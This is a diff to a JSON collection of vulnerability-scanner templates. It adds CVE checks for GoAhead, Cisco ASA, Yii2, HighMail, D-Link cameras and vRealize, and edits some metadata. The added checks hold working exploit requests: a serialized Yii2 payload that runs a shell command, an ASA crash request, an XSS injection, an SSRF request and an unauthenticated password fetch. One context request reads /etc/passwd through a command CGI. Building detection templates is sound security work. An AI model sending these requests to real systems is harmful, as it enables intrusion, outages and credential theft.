@@ -1130,6 +1130,115 @@
       ]
     },
     {
+      "id": "CVE-2017-17562",
+      "info": {
+        "author": "geeknik",
+        "description": "Embedthis GoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked.",
+        "name": "Embedthis GoAhead RCE",
+        "reference": [
+          "https://www.elttam.com/blog/goahead/",
+          "https://github.com/ivanitlearning/CVE-2017-17562",
+          "https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2017,rce,embedthis,goahead,fuzz"
+      },
+      "requests": [
+        {
+          "attack": "sniper",
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "environment variable",
+                "display library search paths"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "payloads": {
+            "endpoint": [
+              "admin",
+              "apply",
+              "non-CA-rev",
+              "cgitest",
+              "checkCookie",
+              "check_user",
+              "chn/liveView",
+              "cht/liveView",
+              "cnswebserver",
+              "config",
+              "configure/set_link_neg",
+              "configure/swports_adjust",
+              "eng/liveView",
+              "firmware",
+              "getCheckCode",
+              "get_status",
+              "getmac",
+              "getparam",
+              "guest/Login",
+              "home",
+              "htmlmgr",
+              "index",
+              "index/login",
+              "jscript",
+              "kvm",
+              "liveView",
+              "login",
+              "login.asp",
+              "login/login",
+              "login/login-page",
+              "login_mgr",
+              "luci",
+              "main",
+              "main-cgi",
+              "manage/login",
+              "menu",
+              "mlogin",
+              "netbinary",
+              "nobody/Captcha",
+              "nobody/VerifyCode",
+              "normal_userLogin",
+              "otgw",
+              "page",
+              "rulectl",
+              "service",
+              "set_new_config",
+              "sl_webviewer",
+              "ssi",
+              "status",
+              "sysconf",
+              "systemutil",
+              "t/out",
+              "top",
+              "unauth",
+              "upload",
+              "variable",
+              "wanstatu",
+              "webcm",
+              "webmain",
+              "webproc",
+              "webscr",
+              "webviewLogin",
+              "webviewLogin_m64",
+              "webviewer",
+              "welcome"
+            ]
+          },
+          "raw": [
+            "GET /cgi-bin/§endpoint§?LD_DEBUG=help HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nAccept: */*\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-3881",
       "info": {
         "author": "dwisiswant0",
@@ -1469,6 +1578,46 @@
             "{{BaseURL}}/zend/vendor/phpunit/phpunit/phpunit",
             "{{BaseURL}}/yii/vendor/phpunit/phpunit/phpunit"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-0101",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "A vulnerability in the XML parser of Cisco Adaptive Security Appliance (ASA) Software could allow an unauthenticated,\nremote attacker to cause a reload of the affected system or to remotely execute code. It was also possible that\nthe ASA could stop processing incoming Virtual Private Network (VPN) authentication requests due to a low memory condition.\n",
+        "name": "Cisco ASA Denial-of-Service",
+        "reference": "https://www.exploit-db.com/exploits/43986",
+        "severity": "critical",
+        "tags": "cve,cve2018,cisco,dos,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "dsl": [
+                "status_code_1 == 200"
+              ],
+              "type": "dsl"
+            },
+            {
+              "condition": "or",
+              "dsl": [
+                "status_code_2 == 500",
+                "status_code_2 == 501",
+                "status_code_2 == 502",
+                "status_code_2 == 503",
+                "status_code_2 == 504"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nX-Aggregate-Auth: 1\nX-Transcend-Version: 1\nAccept-Encoding: identity\nX-AnyConnect-Platform: linux-64\nX-Support-HTTP-Auth: false\nX-Pad: 0000000000000000000000000000000000000000\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"a\" type=\"a\" aggregate-auth-version=\"a\">\n    <host-scan-reply>A</host-scan-reply>\n</config-auth>\n"
+          ],
+          "req-condition": true
         }
       ]
     },
@@ -3100,8 +3249,9 @@
       "id": "CVE-2019-11869",
       "info": {
         "author": "ganofins",
-        "description": "The Yuzo Related Posts plugin before 5.12.94 for WordPress has XSS\nbecause it mistakenly expects that is_admin() verifies that the\nrequest comes from an admin user (it actually only verifies that the\nrequest is for an admin page). An unauthenticated attacker can inject\na payload into the plugin settings, such as the\nyuzo_related_post_css_and_style setting.\n\nReferences:\n- https://www.wordfence.com/blog/2019/04/yuzo-related-posts-zero-day-vulnerability-exploited-in-the-wild\n- https://wpscan.com/vulnerability/9254\n",
+        "description": "The Yuzo Related Posts plugin before 5.12.94 for WordPress has XSS\nbecause it mistakenly expects that is_admin() verifies that the\nrequest comes from an admin user (it actually only verifies that the\nrequest is for an admin page). An unauthenticated attacker can inject\na payload into the plugin settings, such as the\nyuzo_related_post_css_and_style setting.\n",
         "name": "Yuzo Related Posts plugin XSS",
+        "reference": "- https://www.wordfence.com/blog/2019/04/yuzo-related-posts-zero-day-vulnerability-exploited-in-the-wild\n- https://wpscan.com/vulnerability/9254\n",
         "severity": "medium",
         "tags": "cve,cve2019,wordpress,wp-plugin,xss"
       },
@@ -3279,6 +3429,7 @@
       "id": "CVE-2019-14205",
       "info": {
         "author": "pikpikcu",
+        "description": "A Local File Inclusion vulnerability in the Nevma Adaptive Images plugin before 0.6.67 for WordPress allows remote attackers to retrieve arbitrary files via the $REQUEST['adaptive-images-settings']['source_file'] parameter in adaptive-images-script.php.",
         "name": "WordPress Ext Adaptive Images LFI",
         "reference": "https://github.com/security-kma/EXPLOITING-CVE-2019-14205",
         "severity": "high",
@@ -3761,8 +3912,9 @@
       "id": "CVE-2019-17382",
       "info": {
         "author": "Harsh Bothra",
+        "description": "An issue was discovered in zabbix.php?action=dashboard.view&dashboardid=1 in Zabbix through 4.4. An attacker can bypass the login page and access the dashboard page, and then create a Dashboard, Report, Screen, or Map without any Username/Password (i.e., anonymously). All created elements (Dashboard/Report/Screen/Map) are accessible by other users and by an admin.",
         "name": "Zabbix Authentication Bypass",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-17382",
+        "reference": "https://www.exploit-db.com/exploits/47467",
         "severity": "critical",
         "tags": "cve,cve2019,zabbix"
       },
@@ -6122,6 +6274,41 @@
       ]
     },
     {
+      "id": "CVE-2020-15148",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Yii 2 (yiisoft/yii2) RCE",
+        "reference": "- https://blog.csdn.net/xuandao_ahfengren/article/details/111259943\n- https://github.com/nosafer/nosafer.github.io/blob/227a05f5eff69d32a027f15d6106c6d735124659/docs/Web%E5%AE%89%E5%85%A8/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md\n",
+        "severity": "high",
+        "tags": "cve,cve2020,rce,yii"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "total",
+                "internal server error"
+              ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ=="
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-15505",
       "info": {
         "author": "dwisiswant0",
@@ -6855,6 +7042,41 @@
       ]
     },
     {
+      "id": "CVE-2020-23517",
+      "info": {
+        "author": "geeknik",
+        "description": "XSS vulnerability in Aryanic HighMail (High CMS) versions 2020 and before allows remote attackers to inject arbitrary web script or HTML, via 'user' to LoginForm.",
+        "name": "Aryanic HighMail (High CMS) XSS",
+        "reference": "https://vulnerabilitypublishing.blogspot.com/2021/03/aryanic-highmail-high-cms-reflected.html",
+        "severity": "medium",
+        "tags": "xss,cve,cve2020"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "<img src=\"x\" onerror=\"alert('XSS')"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/login/?uid=\"><img%20src=\"x\"%20onerror=\"alert(%27XSS%27);\">"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-23972",
       "info": {
         "author": "dwisiswant0",
@@ -7089,6 +7311,49 @@
           "raw": [
             "POST / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nDNT: 1\nConnection: close\nCookie: uid=6gPjT2ipmNz\nUpgrade-Insecure-Requests: 1\nContent-Length: 0\n\nusername=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\n",
             "GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nDNT: 1\nConnection: close\nCookie: uid=6gPjT2ipmNz\nUpgrade-Insecure-Requests: 1\nContent-Length: 0\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-25078",
+      "info": {
+        "author": "pikpikcu",
+        "description": "An issue was discovered on D-Link DCS-2530L before 1.06.01 Hotfix and DCS-2670L through 2.02 devices. The unauthenticated /config/getuser endpoint allows for remote administrator password disclosure.",
+        "name": "D-Link DCS-2530L Administrator password disclosure",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-25078",
+        "severity": "high",
+        "tags": "cve,cve2020,dlink"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "name=",
+                "pass="
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/plain"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/config/getuser?index=0"
           ]
         }
       ]
@@ -9145,6 +9410,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ui/vropspluginui/rest/services/getstatus"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21975",
+      "info": {
+        "author": "luci",
+        "description": "A malicious actor with network access to the vRealize Operations Manager API can perform a Server Side Request Forgery attack to steal administrative credentials or trigger Remote Code Execution using CVE-2021-21983.",
+        "name": "vRealize Operations Manager API SSRF (VMWare Operations)",
+        "reference": "https://www.vmware.com/security/advisories/VMSA-2021-0004.html",
+        "severity": "critical",
+        "tags": "cve,cve2021,ssrf,vmware"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "vRealize Operations Manager",
+                "thumbprint",
+                "address"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /casa/nodes/thumbprints HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json;charset=UTF-8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n\n[\"127.0.0.1:443/ui/\"]\n"
           ]
         }
       ]
